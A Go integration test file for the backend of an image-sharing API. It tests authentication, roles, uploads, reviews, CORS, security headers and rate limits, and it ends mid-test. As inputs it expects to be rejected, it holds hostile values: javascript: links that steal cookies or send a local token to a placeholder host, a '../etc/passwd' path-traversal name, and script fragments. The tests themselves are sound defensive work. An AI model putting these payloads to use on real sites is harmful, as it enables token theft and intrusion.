package server

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/waifu-im/waifu-api/backend/internal/auth"
	"github.com/waifu-im/waifu-api/backend/internal/config"
)

func TestLoginMeAndNullAvatar(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000001", "noavatar", "")

	w := e.do("GET", "/users/me", nil, withToken(tok))
	expectStatus(t, w, http.StatusOK)
	me := decode[userDto](t, w)
	if me.Name != "noavatar" || me.AvatarURL != "" || me.Role != "User" {
		t.Fatalf("unexpected profile %+v", me)
	}

	calls := e.discord.calls
	w = e.do("POST", "/auth/discord", map[string]string{"code": "<script>"})
	expectStatus(t, w, http.StatusBadRequest)
	if e.discord.calls != calls {
		t.Fatal("invalid code must not reach Discord")
	}
	w = e.do("POST", "/auth/discord", map[string]string{"code": "unknowncode"})
	expectStatus(t, w, http.StatusBadRequest)
}

func TestRolesAndBansComeFromDatabase(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000002", "alice", "")
	_, otherID := e.login("100000000000000003", "bob", "")

	expectStatus(t, e.do("GET", "/users", nil, withToken(tok)), http.StatusForbidden)

	e.setRole(uid, auth.RoleAdmin)
	expectStatus(t, e.do("GET", "/users", nil, withToken(tok)), http.StatusOK)

	e.setRole(uid, auth.RoleUser)
	expectStatus(t, e.do("GET", "/users", nil, withToken(tok)), http.StatusForbidden)

	e.setRole(uid, auth.RoleAdmin)
	w := e.do("PUT", fmt.Sprintf("/users/%d/ban", otherID), map[string]any{"isBlacklisted": true, "reason": "spam"}, withToken(tok))
	expectStatus(t, w, http.StatusOK)

	w = e.do("POST", "/auth/discord", map[string]string{"code": "code100000000000000003"})
	expectStatus(t, w, http.StatusForbidden)
	if !strings.Contains(w.Body.String(), "spam") {
		t.Fatalf("ban reason missing: %s", w.Body.String())
	}

	e.exec(`DELETE FROM "Users" WHERE "Id" = $1`, uid)
	expectStatus(t, e.do("GET", "/users/me", nil, withToken(tok)), http.StatusUnauthorized)
}

func TestAPIKeyLifecycle(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000004", "keys", "")

	w := e.do("POST", "/auth/api-keys", map[string]any{"description": "bot"}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	key := decode[createdAPIKeyDto](t, w).Key
	if len(key) < 30 {
		t.Fatalf("unexpected key %q", key)
	}

	expectStatus(t, e.do("GET", "/users/me", nil, withAPIKey(key)), http.StatusOK)

	expectStatus(t, e.do("POST", "/auth/api-keys", map[string]any{"description": "evil"}, withAPIKey(key)), http.StatusForbidden)

	past := time.Now().Add(-time.Hour)
	expectStatus(t, e.do("POST", "/auth/api-keys", map[string]any{"description": "old", "expirationDate": past}, withToken(tok)), http.StatusBadRequest)

	expectStatus(t, e.do("POST", "/auth/api-keys", map[string]any{"description": "two"}, withToken(tok)), http.StatusCreated)
	expectStatus(t, e.do("POST", "/auth/api-keys", map[string]any{"description": "three"}, withToken(tok)), http.StatusCreated)
	expectStatus(t, e.do("POST", "/auth/api-keys", map[string]any{"description": "four"}, withToken(tok)), http.StatusConflict)

	if err := e.srv.stats.flush(context.Background()); err != nil {
		t.Fatal(err)
	}
	if n := e.scalar(`SELECT COUNT(*) FROM "ApiKeys" WHERE "UserId" = $1 AND "LastUsedAt" IS NOT NULL`, uid); n != 1 {
		t.Fatalf("expected LastUsedAt to be set for the used key, got %d", n)
	}

	e.exec(`UPDATE "ApiKeys" SET "ExpirationDate" = now() - interval '1 minute' WHERE "UserId" = $1`, uid)
	w = e.do("GET", "/users/me", nil, withAPIKey(key))
	expectStatus(t, w, http.StatusUnauthorized)
}

func TestUploadHardening(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000005", "uploader", "")
	otherTok, _ := e.login("100000000000000006", "other", "")
	modTok, modID := e.login("100000000000000007", "mod", "")
	e.setRole(modID, auth.RoleModerator)

	w := e.multipart("POST", "/images/upload", uploadSpec{file: noisePNG(t, 1, 160, 200), filename: "evil.html"}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	img := decode[imageDto](t, w)
	if img.Extension != ".png" || !strings.HasSuffix(img.URL, ".png") {
		t.Fatalf("extension must come from the content, got %q / %q", img.Extension, img.URL)
	}
	obj, ok := e.store.get(fmt.Sprintf("%d.png", img.ID))
	if !ok || obj.contentType != "image/png" {
		t.Fatalf("stored object missing or wrong content type: %+v", obj)
	}
	if img.ReviewStatus != "Pending" || img.UploaderID == nil || *img.UploaderID != uid {
		t.Fatalf("unexpected upload result %+v", img)
	}

	path := fmt.Sprintf("/images/%d", img.ID)
	expectStatus(t, e.do("GET", path, nil), http.StatusNotFound)
	expectStatus(t, e.do("GET", path, nil, withToken(otherTok)), http.StatusNotFound)
	expectStatus(t, e.do("GET", path, nil, withToken(tok)), http.StatusOK)
	expectStatus(t, e.do("GET", path, nil, withToken(modTok)), http.StatusOK)

	w, _ = e.upload(tok, 2, map[string][]string{"source": {"javascript:alert(document.cookie)"}})
	expectStatus(t, w, http.StatusBadRequest)

	w = e.multipart("POST", "/images/upload", uploadSpec{file: noisePNG(t, 1, 160, 200)}, withToken(tok))
	expectStatus(t, w, http.StatusConflict)

	w = e.multipart("POST", "/images/upload", uploadSpec{file: []byte("<svg/>"), filename: "x.svg", contentType: "image/svg+xml"}, withToken(tok))
	expectStatus(t, w, http.StatusBadRequest)
	w = e.multipart("POST", "/images/upload", uploadSpec{file: []byte("<html>"), filename: "x.png", contentType: "image/png"}, withToken(tok))
	expectStatus(t, w, http.StatusBadRequest)

	w = e.multipart("POST", "/images/upload", uploadSpec{file: noisePNG(t, 3, 4100, 64)}, withToken(tok))
	expectStatus(t, w, http.StatusBadRequest)

	before := e.scalar(`SELECT COUNT(*) FROM "Images"`)
	e.store.mu.Lock()
	e.store.failUploads = true
	e.store.mu.Unlock()
	w, _ = e.upload(tok, 4, nil)
	expectStatus(t, w, http.StatusInternalServerError)
	e.store.mu.Lock()
	e.store.failUploads = false
	e.store.mu.Unlock()
	if after := e.scalar(`SELECT COUNT(*) FROM "Images"`); after != before {
		t.Fatalf("failed upload left %d rows behind", after-before)
	}
	if n := e.scalar(`SELECT COUNT(*) FROM "ReviewTasks" WHERE "Status" = 0 AND "Kind" = 0`); n != 1 {
		t.Fatalf("expected exactly one pending submission, got %d", n)
	}

	e.setRole(uid, auth.RoleTrustedUser)
	w, trusted := e.upload(tok, 5, nil)
	expectStatus(t, w, http.StatusCreated)
	if trusted.ReviewStatus != "Accepted" {
		t.Fatalf("trusted upload should be accepted, got %s", trusted.ReviewStatus)
	}
	expectStatus(t, e.do("GET", fmt.Sprintf("/images/%d", trusted.ID), nil), http.StatusOK)
}

func TestListImagesLimitsAndCaseInsensitiveParams(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000008", "trusted", "")
	e.setRole(uid, auth.RoleTrustedUser)

	w := e.do("POST", "/tags", map[string]string{"name": "Maid", "description": "maid outfit"}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	for i := int64(0); i < 7; i++ {
		fields := map[string][]string{}
		if i%2 == 0 {
			fields["tags"] = []string{"maid"}
		}
		w, _ := e.upload(tok, 100+i, fields)
		expectStatus(t, w, http.StatusCreated)
	}

	w = e.do("GET", "/images?pageSize=100000&orderBy=UploadedAt", nil)
	expectStatus(t, w, http.StatusOK)
	page := decode[paginated](t, w)
	if page.MaxPageSize != 500 || page.TotalCount != 7 {
		t.Fatalf("unexpected page meta %+v", page)
	}

	w = e.do("GET", "/images?IncludedTags=maid&PageSize=50", nil)
	expectStatus(t, w, http.StatusOK)
	if got := decode[paginated](t, w).TotalCount; got != 4 {
		t.Fatalf("case-insensitive includedTags should match 4 images, got %d", got)
	}
	w = e.do("GET", "/images?excludedTags=maid&pageSize=50", nil)
	if got := decode[paginated](t, w).TotalCount; got != 3 {
		t.Fatalf("excludedTags should leave 3 images, got %d", got)
	}

	var q []string
	for i := 0; i < 60; i++ {
		q = append(q, fmt.Sprintf("includedTags=t%d", i))
	}
	expectStatus(t, e.do("GET", "/images?"+strings.Join(q, "&"), nil), http.StatusBadRequest)

	seen := map[int64]bool{}
	for p := 1; p <= 4; p++ {
		w = e.do("GET", fmt.Sprintf("/images?orderBy=UploadedAt&pageSize=2&page=%d", p), nil)
		for _, it := range decode[struct{ Items []imageDto }](t, w).Items {
			if seen[it.ID] {
				t.Fatalf("image %d returned twice across pages", it.ID)
			}
			seen[it.ID] = true
		}
	}
	if len(seen) != 7 {
		t.Fatalf("expected 7 distinct images across pages, got %d", len(seen))
	}

	expectStatus(t, e.do("GET", "/images?page=9223372036854775807&pageSize=500", nil), http.StatusOK)
	expectStatus(t, e.do("GET", "/images?orderBy=DROP", nil), http.StatusBadRequest)
	expectStatus(t, e.do("GET", "/images?reviewStatus=Pending", nil, withToken(tok)), http.StatusForbidden)
}

func TestAlbumIsolation(t *testing.T) {
	e := newTestEnv(t)
	aliceTok, aliceID := e.login("100000000000000009", "alice", "")
	bobTok, _ := e.login("100000000000000010", "bob", "")
	e.setRole(aliceID, auth.RoleTrustedUser)

	w := e.do("POST", "/users/me/albums", map[string]string{"name": "Private", "description": "mine"}, withToken(aliceTok))
	expectStatus(t, w, http.StatusCreated)
	album := decode[albumDto](t, w)

	_, img := e.upload(aliceTok, 200, nil)
	expectStatus(t, e.do("POST", fmt.Sprintf("/users/me/albums/%d/images/%d", album.ID, img.ID), nil, withToken(aliceTok)), http.StatusNoContent)

	expectStatus(t, e.do("GET", fmt.Sprintf("/users/me/albums/%d", album.ID), nil, withToken(bobTok)), http.StatusNotFound)
	expectStatus(t, e.do("GET", fmt.Sprintf("/users/me/albums/%d/images?pageSize=10", album.ID), nil, withToken(bobTok)), http.StatusNotFound)
	e.do("DELETE", fmt.Sprintf("/users/me/albums/%d/images/%d", album.ID, img.ID), nil, withToken(bobTok))
	if n := e.scalar(`SELECT COUNT(*) FROM "AlbumItems" WHERE "AlbumId" = $1`, album.ID); n != 1 {
		t.Fatal("foreign user removed an image from the album")
	}

	w = e.do("GET", fmt.Sprintf("/users/me/albums/%d/images?pageSize=10", album.ID), nil, withToken(aliceTok))
	expectStatus(t, w, http.StatusOK)
	if decode[paginated](t, w).TotalCount != 1 {
		t.Fatal("owner should see the album image")
	}

	expectStatus(t, e.do("POST", fmt.Sprintf("/users/me/albums/%d/images/999999", album.ID), nil, withToken(aliceTok)), http.StatusNotFound)

	expectStatus(t, e.do("POST", fmt.Sprintf("/users/me/albums/favorites/images/%d", img.ID), nil, withToken(bobTok)), http.StatusNoContent)
	w = e.do("GET", fmt.Sprintf("/images/%d", img.ID), nil, withToken(bobTok))
	got := decode[imageDto](t, w)
	if got.LikedAt == nil || got.Favorites != 1 {
		t.Fatalf("expected like to be visible, got %+v", got)
	}

	created := 0
	for i := 0; i < 10; i++ {
		w := e.do("POST", "/users/me/albums", map[string]string{"name": fmt.Sprintf("a%d", i)}, withToken(bobTok))
		if w.Code == http.StatusCreated {
			created++
		} else {
			expectStatus(t, w, http.StatusConflict)
		}
	}
	if created != 4 {
		t.Fatalf("expected 4 additional albums, got %d", created)
	}
}

func TestArtistAndTagValidationAndVisibility(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000011", "creator", "")
	otherTok, _ := e.login("100000000000000012", "other", "")

	w := e.do("POST", "/artists", map[string]any{"name": "Evil", "twitter": "javascript:fetch('//x?'+localStorage.token)"}, withToken(tok))
	expectStatus(t, w, http.StatusBadRequest)

	w = e.do("POST", "/artists", map[string]any{"name": "Good Artist", "twitter": "https://twitter.com/good"}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	artist := decode[artistEntity](t, w)
	if artist.ReviewStatus != "Pending" {
		t.Fatal("new artists need review")
	}

	path := fmt.Sprintf("/artists/%d", artist.ID)
	expectStatus(t, e.do("GET", path, nil), http.StatusNotFound)
	expectStatus(t, e.do("GET", path, nil, withToken(otherTok)), http.StatusNotFound)
	expectStatus(t, e.do("GET", path, nil, withToken(tok)), http.StatusOK)
	w = e.do("GET", fmt.Sprintf("/artists?IncludedIds=%d", artist.ID), nil, withToken(otherTok))
	if decode[paginated](t, w).TotalCount != 0 {
		t.Fatal("includedIds must not leak other users' pending artists")
	}

	expectStatus(t, e.do("POST", "/tags", map[string]string{"name": "猫", "description": "cat"}, withToken(tok)), http.StatusBadRequest)
	w = e.do("POST", "/tags", map[string]string{"name": "猫", "description": "cat", "slug": "neko"}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	expectStatus(t, e.do("POST", "/tags", map[string]string{"name": "Neko!", "description": "dup"}, withToken(tok)), http.StatusConflict)

	expectStatus(t, e.do("GET", "/tags/by-slug/neko", nil), http.StatusNotFound)
	expectStatus(t, e.do("GET", "/tags/by-slug/neko", nil, withToken(tok)), http.StatusOK)
	w = e.do("GET", "/tags?IncludedSlugs=neko", nil, withToken(tok))
	if decode[paginated](t, w).TotalCount != 1 {
		t.Fatal("creator should resolve own pending tag via IncludedSlugs")
	}
}

func TestReviewWorkflow(t *testing.T) {
	e := newTestEnv(t)
	trustedTok, trustedID := e.login("100000000000000013", "trusted", "")
	userTok, userID := e.login("100000000000000014", "user", "")
	modTok, modID := e.login("100000000000000015", "mod", "")
	e.setRole(trustedID, auth.RoleTrustedUser)
	e.setRole(modID, auth.RoleModerator)

	for _, name := range []string{"Alpha", "Beta"} {
		expectStatus(t, e.do("POST", "/tags", map[string]string{"name": name, "description": name + " tag"}, withToken(trustedTok)), http.StatusCreated)
	}
	_, img := e.upload(trustedTok, 300, map[string][]string{"tags": {"alpha"}})

	w := e.do("POST", "/review/tasks", map[string]any{
		"targetType": "Image", "targetId": img.ID,
		"payload": map[string]any{"addTagSlugs": []string{"beta"}, "removeTagSlugs": []string{"alpha"}},
	}, withToken(trustedTok))
	expectStatus(t, w, http.StatusCreated)
	if task := decode[reviewTaskDto](t, w); task.Status != "Approved" {
		t.Fatalf("trusted edit should be auto-applied, got %s", task.Status)
	}
	w = e.do("GET", fmt.Sprintf("/images/%d", img.ID), nil)
	tags := decode[imageDto](t, w).Tags
	if len(tags) != 1 || tags[0].Slug != "beta" {
		t.Fatalf("expected tags [beta], got %+v", tags)
	}

	w = e.do("POST", "/review/tasks", map[string]any{
		"targetType": "Image", "targetId": img.ID, "reason": "better source",
		"payload": map[string]any{"source": "https://pixiv.net/artworks/1"},
	}, withToken(userTok))
	expectStatus(t, w, http.StatusCreated)
	task := decode[reviewTaskDto](t, w)
	if task.Status != "Pending" {
		t.Fatal("regular edits need review")
	}
	if target, ok := task.Target["image"].(map[string]any); !ok || target["uploaderId"] != nil {
		t.Fatalf("uploaderId leaked to a non-moderator: %v", task.Target)
	}
	expectStatus(t, e.do("POST", "/review/tasks", map[string]any{
		"targetType": "Image", "targetId": img.ID, "payload": map[string]any{"source": "https://pixiv.net/artworks/2"},
	}, withToken(userTok)), http.StatusConflict)
	w = e.do("POST", "/review/tasks", map[string]any{
		"targetType": "Image", "targetId": img.ID, "payload": map[string]any{"source": "javascript:alert(1)"},
	}, withToken(modTok))
	expectStatus(t, w, http.StatusBadRequest)

	approve := fmt.Sprintf("/review/tasks/%d/approve", task.ID)
	expectStatus(t, e.do("PATCH", approve, nil, withToken(userTok)), http.StatusForbidden)
	expectStatus(t, e.do("PATCH", approve, nil, withToken(modTok)), http.StatusNoContent)
	expectStatus(t, e.do("PATCH", approve, nil, withToken(modTok)), http.StatusConflict)
	w = e.do("GET", fmt.Sprintf("/images/%d", img.ID), nil)
	if src := decode[imageDto](t, w).Source; src == nil || *src != "https://pixiv.net/artworks/1" {
		t.Fatalf("approved edit not applied: %v", src)
	}

	w = e.do("POST", "/tags", map[string]string{"name": "Gamma", "description": "gamma"}, withToken(userTok))
	expectStatus(t, w, http.StatusCreated)
	gamma := decode[tagDto](t, w)
	taskID := e.scalar(`SELECT "Id" FROM "ReviewTasks" WHERE "TargetType" = 1 AND "TargetId" = $1`, gamma.ID)
	e.exec(`UPDATE "Tags" SET "ReviewStatus" = 1 WHERE "Id" = $1`, gamma.ID)
	expectStatus(t, e.do("PATCH", fmt.Sprintf("/review/tasks/%d/cancel", taskID), nil, withToken(userTok)), http.StatusNoContent)
	if n := e.scalar(`SELECT COUNT(*) FROM "Tags" WHERE "Id" = $1`, gamma.ID); n != 1 {
		t.Fatal("an accepted tag must never be deleted through the review queue")
	}

	_, pending := e.upload(userTok, 301, nil)
	key := fmt.Sprintf("%d%s", pending.ID, pending.Extension)
	if _, ok := e.store.get(key); !ok {
		t.Fatal("upload not stored")
	}
	pendingTask := e.scalar(`SELECT "Id" FROM "ReviewTasks" WHERE "TargetType" = 0 AND "TargetId" = $1 AND "Kind" = 0`, pending.ID)
	expectStatus(t, e.do("PATCH", fmt.Sprintf("/review/tasks/%d/reject", pendingTask), map[string]string{"reason": "low quality"}, withToken(modTok)), http.StatusNoContent)
	if _, ok := e.store.get(key); ok {
		t.Fatal("rejected upload file still stored")
	}
	if n := e.scalar(`SELECT COUNT(*) FROM "Images" WHERE "Id" = $1`, pending.ID); n != 0 {
		t.Fatal("rejected upload row still present")
	}

	w = e.do("GET", "/review/tasks?pageSize=100", nil, withToken(userTok))
	for _, it := range decode[struct{ Items []reviewTaskDto }](t, w).Items {
		if it.SubmitterID == nil || *it.SubmitterID != userID {
			t.Fatalf("user sees foreign task %d", it.ID)
		}
	}
}

func TestReportsFlow(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000016", "reporter", "")
	modTok, modID := e.login("100000000000000017", "mod", "")
	e.setRole(uid, auth.RoleTrustedUser)
	e.setRole(modID, auth.RoleModerator)
	_, img := e.upload(tok, 400, nil)

	expectStatus(t, e.do("POST", "/reports", map[string]any{"imageId": 99999, "description": "x"}, withToken(tok)), http.StatusNotFound)
	w := e.do("POST", "/reports", map[string]any{"imageId": img.ID, "description": "  wrong tags  "}, withToken(tok))
	expectStatus(t, w, http.StatusCreated)
	rep := decode[reportDto](t, w)
	if rep.Description != "wrong tags" {
		t.Fatalf("description should be trimmed, got %q", rep.Description)
	}
	expectStatus(t, e.do("POST", "/reports", map[string]any{"imageId": img.ID, "description": "again"}, withToken(tok)), http.StatusConflict)

	path := fmt.Sprintf("/reports/%d/validate", rep.ID)
	expectStatus(t, e.do("PATCH", path, map[string]string{"reason": "fixed"}, withToken(modTok)), http.StatusNoContent)
	expectStatus(t, e.do("PATCH", path, nil, withToken(modTok)), http.StatusConflict)
	expectStatus(t, e.do("PATCH", "/reports/123456/validate", nil, withToken(modTok)), http.StatusNotFound)

	w = e.do("GET", "/reports?pageSize=10", nil, withToken(modTok))
	expectStatus(t, w, http.StatusOK)
	items := decode[struct{ Items []reportDto }](t, w).Items
	if len(items) != 1 || items[0].Image == nil || items[0].Image.ID != img.ID {
		t.Fatalf("report list should include the hydrated image: %+v", items)
	}
}

func TestStorageDiffSafety(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000018", "admin", "")
	e.setRole(uid, auth.RoleAdmin)
	_, img := e.upload(tok, 500, nil)
	key := fmt.Sprintf("%d%s", img.ID, img.Extension)
	_ = e.store.Upload(context.Background(), "orphan.png", strings.NewReader("x"), 1, "image/png")

	w := e.do("GET", "/storage-diff?mode=OrphansInS3", nil, withToken(tok))
	expectStatus(t, w, http.StatusOK)
	if decode[paginated](t, w).TotalCount != 1 {
		t.Fatal("expected one orphan")
	}

	expectStatus(t, e.do("DELETE", "/storage-diff/s3", map[string]any{"fileNames": []string{key}}, withToken(tok)), http.StatusConflict)
	if _, ok := e.store.get(key); !ok {
		t.Fatal("live image file was deleted")
	}
	expectStatus(t, e.do("DELETE", "/storage-diff/s3", map[string]any{"fileNames": []string{"../etc/passwd"}}, withToken(tok)), http.StatusBadRequest)
	expectStatus(t, e.do("DELETE", "/storage-diff/s3", map[string]any{"fileNames": []string{"orphan.png"}}, withToken(tok)), http.StatusNoContent)

	expectStatus(t, e.do("DELETE", "/storage-diff/db", map[string]any{"imageIds": []int64{img.ID}}, withToken(tok)), http.StatusConflict)
	_ = e.store.Delete(context.Background(), key)
	w = e.do("GET", "/storage-diff?mode=MissingFromS3", nil, withToken(tok))
	if decode[paginated](t, w).TotalCount != 1 {
		t.Fatal("expected one missing file")
	}
	expectStatus(t, e.do("DELETE", "/storage-diff/db", map[string]any{"imageIds": []int64{img.ID}}, withToken(tok)), http.StatusNoContent)
	if n := e.scalar(`SELECT COUNT(*) FROM "Images" WHERE "Id" = $1`, img.ID); n != 0 {
		t.Fatal("row not removed")
	}
}

func TestSecurityHeadersAndCORS(t *testing.T) {
	e := newTestEnv(t)
	w := e.do("GET", "/healthz", nil, withHeader("Origin", "https://app.test"), withHeader("X-Request-Id", "bad id\x01<script>"))
	expectStatus(t, w, http.StatusOK)
	h := w.Header()
	for _, k := range []string{"X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy", "Referrer-Policy"} {
		if h.Get(k) == "" {
			t.Errorf("missing security header %s", k)
		}
	}
	if h.Get("Access-Control-Allow-Origin") != "https://app.test" || !strings.Contains(strings.Join(h.Values("Vary"), ","), "Origin") {
		t.Errorf("unexpected CORS headers %v", h)
	}
	if id := h.Get("X-Request-Id"); strings.ContainsAny(id, " <>\x01") || len(id) != 32 {
		t.Errorf("request id not sanitized: %q", id)
	}

	w = e.do("GET", "/healthz", nil, withHeader("Origin", "https://evil.test"))
	if w.Header().Get("Access-Control-Allow-Origin") != "" {
		t.Error("foreign origin must not be allowed")
	}

	w = e.do("GET", "/healthz", nil, withRemote("10.0.0.1:1"), withHeader("X-Forwarded-Proto", "https"))
	if w.Header().Get("Strict-Transport-Security") == "" {
		t.Error("expected HSTS for HTTPS via trusted proxy")
	}
	w = e.do("GET", "/healthz", nil, withHeader("X-Forwarded-Proto", "https"))
	if w.Header().Get("Strict-Transport-Security") != "" {
		t.Error("untrusted X-Forwarded-Proto must be ignored")
	}

	w = e.do("GET", "/scalar", nil)
	if !strings.Contains(w.Body.String(), `integrity="sha384-`) {
		t.Error("scalar script must be pinned with SRI")
	}
	if csp := w.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "script-src https://cdn.jsdelivr.net") {
		t.Errorf("API reference must get the docs CSP, got %q", csp)
	}
	if csp := e.do("GET", "/healthz", nil).Header().Get("Content-Security-Policy"); !strings.HasPrefix(csp, "default-src 'none'") {
		t.Errorf("API responses must get the strict CSP, got %q", csp)
	}

	if v := strings.Join(e.do("GET", "/healthz", nil).Header().Values("Vary"), ","); !strings.Contains(v, "Origin") {
		t.Errorf("missing Vary: Origin, got %q", v)
	}
	w = e.do("OPTIONS", "/images", nil, withHeader("Origin", "https://app.test"))
	expectStatus(t, w, http.StatusNoContent)
	if w.Header().Get("Access-Control-Allow-Methods") == "" {
		t.Error("OPTIONS of an allowed origin must carry the CORS method list")
	}
}

func TestDocsCSPWithBasePath(t *testing.T) {
	e := newTestEnv(t, func(c *config.Config) { c.APIBasePath = "/api" })
	w := e.do("GET", "/api/scalar", nil)
	expectStatus(t, w, http.StatusOK)
	if csp := w.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "script-src https://cdn.jsdelivr.net") {
		t.Errorf("API reference below the base path must get the docs CSP, got %q", csp)
	}
	if csp := e.do("GET", "/scalar", nil).Header().Get("Content-Security-Policy"); !strings.HasPrefix(csp, "default-src 'none'; frame-ancestors") {
		t.Errorf("unexpected CSP outside the base path: %q", csp)
	}
}

func TestRateLimitCannotBeBypassedWithForwardedFor(t *testing.T) {
	e := newTestEnv(t, func(c *config.Config) {
		c.RateLimit.RequestsPerMinute = 60
		c.RateLimit.Burst = 3
	})
	allowed := 0
	for i := 0; i < 10; i++ {
		w := e.do("GET", "/banner", nil, withRemote("203.0.113.50:1000"), withHeader("X-Forwarded-For", fmt.Sprintf("1.1.1.%d", i)))
		if w.Code != http.StatusTooManyRequests {
			allowed++
		} else if w.Header().Get("Retry-After") == "" {
			t.Fatal("429 without Retry-After")
		}
	}
	if allowed != 3 {
		t.Fatalf("spoofed X-Forwarded-For bypassed the limiter: %d requests allowed", allowed)
	}

	for i := 0; i < 3; i++ {
		w := e.do("GET", "/banner", nil, withRemote("10.0.0.9:1000"), withHeader("X-Forwarded-For", "198.51.100.1"))
		if w.Code == http.StatusTooManyRequests {
			t.Fatal("distinct real client should have its own bucket")
		}
	}
}

func TestAuthEndpointHasStricterLimit(t *testing.T) {
	e := newTestEnv(t, func(c *config.Config) {
		c.RateLimit.AuthRequestsPerMinute = 60
		c.RateLimit.AuthBurst = 2
	})
	codes := []int{}
	for i := 0; i < 4; i++ {
		w := e.do("POST", "/auth/discord", map[string]string{"code": "x"}, withRemote("203.0.113.77:1"))
		codes = append(codes, w.Code)
	}
	if codes[2] != http.StatusTooManyRequests || codes[3] != http.StatusTooManyRequests {
		t.Fatalf("expected login throttling, got %v", codes)
	}
}

func TestStatsAreAggregated(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000019", "stats", "")
	for i := 0; i < 5; i++ {
		e.do("GET", "/users/me", nil, withToken(tok))
	}
	e.do("OPTIONS", "/images", nil, withHeader("Origin", "https://app.test"), withHeader("Access-Control-Request-Method", "GET"))
	e.do("GET", "/healthz", nil)
	if err := e.srv.stats.flush(context.Background()); err != nil {
		t.Fatal(err)
	}
	if n := e.scalar(`SELECT "RequestCount" FROM "Users" WHERE "Id" = $1`, uid); n != 5 {
		t.Fatalf("expected 5 authenticated requests, got %d", n)
	}
	if n := e.scalar(`SELECT "JwtRequestCount" FROM "Users" WHERE "Id" = $1`, uid); n != 5 {
		t.Fatalf("expected 5 jwt requests, got %d", n)
	}
	if n := e.scalar(`SELECT "Value" FROM "GlobalStats" WHERE "Key" = 'TotalRequests'`); n != 6 {
		t.Fatalf("unexpected total %d", n)
	}
}

func TestPublicStatsCountOnlyAccepted(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000020", "u", "")
	e.upload(tok, 600, nil)
	w := e.do("GET", "/stats/public", nil)
	expectStatus(t, w, http.StatusOK)
	if n := decode[map[string]int64](t, w)["totalImages"]; n != 0 {
		t.Fatalf("pending uploads must not be counted publicly, got %d", n)
	}
}

func TestModeratorPatchImageValidation(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000021", "mod", "")
	e.setRole(uid, auth.RoleModerator)
	_, img := e.upload(tok, 700, nil)
	path := fmt.Sprintf("/images/%d", img.ID)

	w := e.multipart("PATCH", path, uploadSpec{fields: map[string][]string{"source": {"javascript:alert(1)"}}}, withToken(tok))
	expectStatus(t, w, http.StatusBadRequest)

	w = e.multipart("PATCH", path, uploadSpec{
		file: gifBytes(t), filename: "x.png", contentType: "image/gif",
		fields: map[string][]string{"reviewStatus": {"Accepted"}, "userId": {fmt.Sprint(uid)}},
	}, withToken(tok))
	expectStatus(t, w, http.StatusOK)
	updated := decode[imageDto](t, w)
	if updated.Extension != ".gif" || !updated.IsAnimated || updated.ReviewStatus != "Accepted" {
		t.Fatalf("unexpected patched image %+v", updated)
	}
	if _, ok := e.store.get(fmt.Sprintf("%d.png", img.ID)); ok {
		t.Fatal("old file should be removed after replacement")
	}
	if obj, ok := e.store.get(fmt.Sprintf("%d.gif", img.ID)); !ok || obj.contentType != "image/gif" {
		t.Fatal("new file missing")
	}

	expectStatus(t, e.do("DELETE", path, nil, withToken(tok)), http.StatusForbidden)
	e.setRole(uid, auth.RoleAdmin)
	expectStatus(t, e.do("DELETE", path, nil, withToken(tok)), http.StatusNoContent)
	if _, ok := e.store.get(fmt.Sprintf("%d.gif", img.ID)); ok {
		t.Fatal("file should be deleted")
	}
	expectStatus(t, e.do("DELETE", path, nil, withToken(tok)), http.StatusNotFound)
}

func TestPermissionsExposeUploadLimits(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000090", "limits", "")
	w := e.do("GET", "/users/me/permissions", nil, withToken(tok))
	expectStatus(t, w, http.StatusOK)
	p := decode[permissionsDto](t, w)
	if p.CanManageBanner {
		t.Fatal("a regular user must not manage the banner")
	}
	if p.Upload.MaxFileSizeMB != e.cfg.MaxUploadMB || p.Upload.MinWidth != e.cfg.Image.MinWidth ||
		len(p.Upload.AllowedContentTypes) != 4 || p.Upload.MaxPixels <= 0 {
		t.Fatalf("unexpected upload limits %+v", p.Upload)
	}
	expectStatus(t, e.do("GET", "/users/me/permissions", nil), http.StatusUnauthorized)
}

func TestUploadRemovedWhileStoringDeletesFile(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000041", "racer", "")
	e.store.mu.Lock()
	e.store.uploadHook = func(key string) {
		id, err := strconv.ParseInt(strings.TrimSuffix(key, ".png"), 10, 64)
		if err != nil {
			t.Errorf("unexpected key %q", key)
			return
		}
		e.exec(`DELETE FROM "Images" WHERE "Id" = $1`, id)
	}
	e.store.mu.Unlock()

	w, _ := e.upload(tok, 4100, nil)
	expectStatus(t, w, http.StatusConflict)
	e.store.mu.Lock()
	e.store.uploadHook = nil
	e.store.mu.Unlock()
	if n := e.store.count(); n != 0 {
		t.Fatalf("the file of a removed upload must be deleted, %d objects left", n)
	}
	if n := e.scalar(`SELECT COUNT(*) FROM "Images"`); n != 0 {
		t.Fatalf("no image row expected, got %d", n)
	}
}

func TestUploadDecodeBudget(t *testing.T) {
	e := newTestEnv(t, func(c *config.Config) { c.Limits.MaxDecodeBytes = 64 << 10 })
	tok, _ := e.login("100000000000000042", "budget", "")
	w, _ := e.upload(tok, 4200, nil)
	expectStatus(t, w, http.StatusBadRequest)
	if !strings.Contains(w.Body.String(), "too much memory") {
		t.Fatalf("unexpected error body %s", w.Body.String())
	}
	if n := e.store.count(); n != 0 {
